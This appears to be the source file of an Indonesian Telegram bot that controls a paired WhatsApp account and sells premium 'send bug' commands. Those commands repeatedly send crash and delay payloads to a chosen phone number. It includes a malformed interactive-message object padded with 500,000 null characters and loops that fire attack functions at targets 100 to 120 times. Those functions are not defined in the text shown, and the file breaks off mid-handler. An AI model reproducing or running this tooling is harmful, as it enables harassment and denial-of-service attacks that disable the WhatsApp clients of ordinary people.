const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const yts = require("yt-search");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./xtraz/tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./xtraz/o.jpg`)
// --- Inisialisasi Bot Telegram ---
const GITHUB_TOKEN_LIST = "https://raw.githubusercontent.com/Fatonklzs/Ha/refs/heads/main/tokens.json";

const bot = new Telegraf(BOT_TOKEN);
global.bot = bot;

(async () => {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST);
    const validTokens = response.data.tokens || [];

    if (!validTokens.includes(BOT_TOKEN)) {
      console.error("TOKEN tidak valid");
      process.exit(1);
    }

  } catch (err) {
    console.error("Gagal ambil tokens:", err.message);
    process.exit(1);
  }
})();

// --- Variabel Global ---
let zephy = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// --- Fungsi untuk Mengambil Konfigurasi dari GitHub ---
// Fungsi untuk Mengambil Konfigurasi dari GitHub dengan Octokit
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./oxcore/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./oxcore/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./oxcore/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./oxcore/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// FUNCTION DOWNLOADER 
async function tiktok(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const encodedParams = new URLSearchParams();
      encodedParams.set("url", query);
      encodedParams.set("hd", "1");

      const response = await axios({
        method: "POST",
        url: "https://tikwm.com/api/",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "Cookie": "current_language=en",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        },
        data: encodedParams,
      });

      const videos = response.data.data;
      const result = {
        title: videos.title,
        cover: videos.cover,
        origin_cover: videos.origin_cover,
        no_watermark: videos.play,
        watermark: videos.wmplay,
        music: videos.music,
      };
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function ytdl(url) {
    const response = await fetch("https://www.vocalremoveroak.com/api/order/create/", {
        method: "POST",
        headers: {
            accept: "*/*",
            api_key: "free",
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            text: url,
        }),
    });

    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    return data;
}

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./oxcore/ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./oxcore/ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./oxcore/userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./oxcore/userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf, Anda bukan user premium. Silakan hubungi developer @Hamzzzt untuk upgrade.");
    }
};

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    zephy = makeWASocket(connectionOptions);

    zephy.ev.on('creds.update', saveCreds);
    store.bind(zephy.ev);

    zephy.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.red(`Bot Telah Aktif King`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));

    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();
    
    startSesi();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
bot.command("reqpair", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /reqpair <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('992')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /reqpair 628xxxxxxxxxx");
    }

    if (zephy && zephy.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await zephy.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*✅ Pairing Code WhatsApp:*

*Nomor:* ${phoneNumber}
*Kode:* ${formattedCode}
        `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});
// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});
// COMMAND FITUR PLAY IGDL TT DLL.
bot.command("tt", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("☘️ *Link TikTok-nya Mana?*");

  const url = args[0];
  const urlRegex = /^(https?:\/\/)?([\w.-]+)+(:\d+)?(\/\S*)?$/;  // Pemeriksaan URL yang lebih umum

  if (!urlRegex.test(url)) {
    return ctx.reply("⚠️ *Itu Bukan Link Yang Benar*");
  }

  ctx.reply("⏳ Tunggu sebentar, sedang mengambil video...");

  try {
    const res = await tiktok(url);
    
    // Mengirim video tanpa watermark
    await ctx.replyWithVideo({ url: res.no_watermark }, { caption: `🎬 Judul: ${res.title}` });
    
    // Mengirim audio dari video
    await ctx.replyWithAudio({ url: res.music }, { title: `tiktok_audio.mp3` });
    
  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.");
  }
});
bot.command('play', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Masukkan judul lagu atau video. Contoh: /play blue by yungkai');
    const searchText = args.join(' ');
    ctx.reply('Mencari video di YouTube...');
    try {
        const results = await yts(searchText);
        if (!results.videos.length) return ctx.reply('Video tidak ditemukan.');
        const video = results.videos[0];
        const response = await fetch(`https://api.siputzx.my.id/api/d/ytmp3?url=${video.url}`);
        const audioData = await response.json();
        if (audioData.status && audioData.data.dl) {
            await ctx.replyWithPhoto(
                { url: video.thumbnail },
                {
                    caption: `Title: ${video.title}\nViews: ${video.views}\nDuration: ${video.timestamp}\nUploaded: ${video.ago}\nURL: ${video.url}`,
                }
            );
            await ctx.replyWithAudio(
                { url: audioData.data.dl },
                { title: video.title }
            );
        } else {
            ctx.reply('Gagal mendownload audio.');
        }
    } catch (error) {
        ctx.reply('Terjadi kesalahan. Coba lagi nanti.');
    }
});
// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
    const caption = `
╭─────────────────
│    *PROSES SEND BUG*   
│────────────────
│⌬ Target: ${target}
│⌬ Status: Proses
╰─────────────────`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Pengiriman Bug Terkirim');
        })
        .catch((error) => {
            console.error('Error sending process response:', error);
        });
};

const donerespone = async (target, ctx) => {
    const caption = `
╭─────────────────
│    *SUCCES SEND BUG*   
│────────────────
│⌬ Target: ${target}
│⌬ Status: Sukses
╰─────────────────`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Done response sent');
        })
        .catch((error) => {
            console.error('Error sending done response:', error);
        });
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /reqpair");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /crash (Placeholder for your actual crash functions) ---

bot.command("tutubug", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

  for (let i = 0; i < 100; i++) {
      await DelayNewBug(target);
      await DelayNewBug(target);
      await DelaySsuper(target, true);
      await DelaySsuper(target, true);
      await delayinvisiXo(target);
  }

    await donerespone(target, ctx);
    return await ctx.reply('Cooldown Active');
});
bot.command("tutudelay", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 100; i++) {
      await DelayNewBug(target);
      await DelaySsuper(target, true);
      await delayinvisiXo(target);
    }

    await donerespone(target, ctx);
    return await ctx.reply('Cooldown Active');
});
bot.command("tutucombo", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 120; i++) {
     await DelayNewBug(target);
     await carousel(target);
     await delayinvisiXo(target);
     await DelaySsuper(target, true);
    }

    await donerespone(target, ctx);
    return await ctx.reply('Cooldown Active');
});

bot.command("tutuinvis", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 100; i++) {
      await DelaySsuper(target, true);
      await delayinvisiXo(target);
    }

    await donerespone(target, ctx);
    return await ctx.reply('Cooldown Active');
});

bot.start(async (ctx) => {
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = `
┏❐  ⌜ Hamtzy ⌟  ❐
┃⭔ Developer : HAMTZY
┃⭔ Script : Tutu Official 
┃⭔ Version : V2.0
┗❐`;

const mainKeyboard = [
    [{ text: "👤 Developer", url: "https://t.me/Hamzzzt" }],
    [
        { text: "BugMenu", callback_data: "kontak" },
        { text: "OwnerMenu", callback_data: "owner_menu" }
    ],
    [{ text: "DownloadMenu", callback_data: "fun_menu" }]
];


  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/2nfrqt.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

bot.action('fun_menu', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const ownerMenuMessage = `
┏❐  ⌜ HAMTZY ⌟  ❐
┃⭔ Developer : HAMTZY
┃⭔ Script : Tutu Official 
┃⭔ Version : V2.0
┗❐

┏❐  ⌜ Fitur ⌟  ❐
┃⭔ /play
┃⭔ /tt
┗❐
  `;

  const ownerKeyboard = [
    [{
      text: "Back",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management dengan video
  await ctx.replyWithPhoto("https://files.catbox.moe/2nfrqt.jpg", {
    caption: ownerMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: ownerKeyboard
    }
  });
});
// Handler untuk callback "owner_management"
bot.action('owner_menu', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const ownerMenuMessage = `
┏❐  ⌜ HAMTZY ⌟  ❐
┃⭔ Developer : HAMTZY
┃⭔ Script : Tutu Official 
┃⭔ Version : V2.0
┗❐

┏❐  ⌜ Fitur ⌟  ❐
┃⭔ /addprem
┃⭔ /delprem
┃⭔ /reqpair
┗❐
  `;

  const ownerKeyboard = [
    [{
      text: "Back",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management dengan video
  await ctx.replyWithPhoto("https://files.catbox.moe/2nfrqt.jpg", {
    caption: ownerMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: ownerKeyboard
    }
  });
});

// Handler untuk callback "owner_management"
bot.action('kontak', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

